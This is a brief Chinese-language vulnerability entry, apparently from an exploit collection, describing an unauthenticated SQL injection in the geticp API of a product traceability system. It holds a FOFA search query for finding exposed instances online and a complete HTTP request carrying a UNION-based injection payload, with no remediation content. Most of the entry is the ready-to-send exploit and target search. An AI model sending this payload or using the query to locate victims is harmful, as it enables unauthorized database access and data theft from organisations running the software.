# 弥特科技全流程追溯系统geticp存在SQL注入

弥特科技全流程追溯系统geticp存在未授权sql注入漏洞

## fofa
```
(body="chunk-libs.45edf705.css" && title="产品追溯系统") || title="4.1.0追溯系统"
```

## poc
```javascript
GET /api/org/enterpriseaccountnoauth/geticp?enterprise_code=1%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d7346475364634d6e4d426a4261466f51717577564359486f7a594571,0x71767a7171),NULL,NULL,NULL--%20- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```
